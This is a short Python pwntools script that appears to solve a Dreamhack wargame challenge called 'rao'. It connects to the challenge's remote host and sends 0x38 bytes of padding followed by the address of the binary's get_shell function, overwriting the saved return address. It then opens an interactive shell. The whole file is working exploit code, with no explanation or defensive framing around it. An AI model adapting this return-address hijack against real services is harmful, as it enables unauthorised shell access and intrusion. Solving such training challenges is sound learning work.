#!/usr/bin/python3

from pwn import *

#p = process("./rao")
p = remote("host1.dreamhack.games", 16196)
e = ELF("./rao")

padding = "C".encode('utf-8')*0x38

payload = padding
payload += p64(e.sym['get_shell'])

p.sendlineafter(":", payload)

p.interactive()
